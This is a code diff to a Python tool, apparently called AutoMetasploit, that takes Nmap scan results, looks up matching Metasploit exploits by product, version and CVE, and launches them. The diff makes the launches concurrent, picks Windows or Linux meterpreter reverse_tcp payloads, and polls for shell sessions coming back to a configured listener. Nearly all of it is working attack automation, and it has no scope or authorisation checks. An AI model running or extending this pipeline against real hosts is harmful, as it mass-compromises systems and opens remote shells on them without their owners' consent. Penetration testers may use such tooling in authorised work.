@@ -1,6 +1,8 @@
 import yaml
 import xml.etree.ElementTree as ET
 from pymetasploit3.msfrpc import MsfRpcClient
+import concurrent.futures
+import time
 
 class AutoMetasploit:
     def __init__(self, xml_file_path, config_path="config.yaml"):
@@ -81,11 +83,9 @@ class AutoMetasploit:
         exploit_data = {}
 
         for service_info in services:
-            # product が空の場合は検索しない
             if not service_info["product"]:
                 continue
 
-            # productとversionを使って検索クエリを作成
             search_params = ["type:exploit"]
             if service_info["version"]:
                 search_params.append(f"{service_info['product']} {service_info['version']}")
@@ -95,7 +95,6 @@ class AutoMetasploit:
             search_query = " ".join(search_params)
             exploits = self.client.modules.search(search_query)
 
-            # 検索結果の辞書格納 (rank: good以上)
             for exploit in exploits:
                 if self.is_high_rank(exploit):
                     ip = service_info["ip"]
@@ -112,12 +111,10 @@ class AutoMetasploit:
                     }
                     exploit_data[ip][port].append(exploit_entry)
 
-            # CVE検索が必要な場合
             if service_info["cve"]:
                 cve_query = f"type:exploit cve:{service_info['cve']}"
                 cve_exploits = self.client.modules.search(cve_query)
 
-                # CVE検索結果の辞書格納 (rank: good以上)
                 for exploit in cve_exploits:
                     if self.is_high_rank(exploit):
                         ip = service_info["ip"]
@@ -136,23 +133,67 @@ class AutoMetasploit:
         
         return exploit_data
 
-    def run_exploits(self, exploit_data):
-        """指定されたエクスプロイト情報に基づき、エクスプロイトを実行する"""
-        if not self.client:
-            print("Metasploit RPCサーバーに接続できていないため、エクスプロイト実行を中止します。")
+    def check_session(self, job_id, wait_time=10):
+        """指定したジョブIDのセッションが確立されたかどうかを確認"""
+        start_time = time.time()
+        while time.time() - start_time < wait_time:
+            sessions = self.client.sessions.list
+            for session_id, session_info in sessions.items():
+                if session_info.get('job_id') == job_id:
+                    print(f"セッション確立: セッションID {session_id}")
+                    return True
+            time.sleep(1)
+        print("セッションが確立されませんでした")
+        return False
+
+    def execute_exploit(self, ip, port, exploit_info):
+        """非同期でエクスプロイトを実行"""
+        if not isinstance(exploit_info, dict):
+            print("エラー: exploit_infoが辞書型ではありません:", exploit_info)
             return
 
-        for ip, ports in exploit_data.items():
-            for port, exploits in ports.items():
-                for exploit_info in exploits:
-                    exploit_module = self.client.modules.use('exploit', exploit_info["name"])
-                    exploit_module['RHOSTS'] = ip
-                    exploit_module['RPORT'] = port
-                    exploit_module['LHOST'] = self.config['lhost']
-                    exploit_module['LPORT'] = self.config['lport']
-                    
-                    print(f"エクスプロイト実行: {exploit_info['name']} (IP: {ip}, Port: {port})")
-                    exploit_module.execute(payload='generic/shell_reverse_tcp')
+        platform = exploit_info.get("platform") or ""
+        default_payload = (
+            'windows/meterpreter/reverse_tcp' if 'windows' in platform.lower()
+            else 'linux/x86/meterpreter/reverse_tcp' if 'linux' in platform.lower()
+            else None
+        )
+
+        try:
+            exploit_module = self.client.modules.use('exploit', exploit_info["name"])
+            exploit_module['RHOSTS'] = ip
+            exploit_module['RPORT'] = port
+            available_payloads = exploit_module.targetpayloads()
+            payload = default_payload if default_payload in available_payloads else available_payloads[0]
+
+            if 'LHOST' in exploit_module.options:
+                exploit_module['LHOST'] = self.config['lhost']
+            if 'LPORT' in exploit_module.options:
+                exploit_module['LPORT'] = self.config['lport']
+
+            print(f"エクスプロイト実行: {exploit_info['name']} (IP: {ip}, Port: {port})")
+            result = exploit_module.execute(payload=payload)
+
+            if result['job_id']:
+                print(f"ジョブID {result['job_id']} のセッション確立待機中...")
+                self.check_session(result['job_id'], wait_time=10)
+
+            else:
+                print("エクスプロイトの実行に失敗しました。")
+
+        except Exception as e:
+            print(f"エクスプロイト実行中にエラーが発生しました: {e}")
+
+    def run_exploits(self, exploit_data):
+        """エクスプロイトを非同期に実行"""
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            futures = [
+                executor.submit(self.execute_exploit, ip, port, exploit_info)
+                for ip, ports in exploit_data.items()
+                for port, exploits in ports.items()
+                for exploit_info in exploits
+            ]
+            concurrent.futures.wait(futures)
 
 # 使用例
 xml_file_path = "nmap_scan_result.xml"
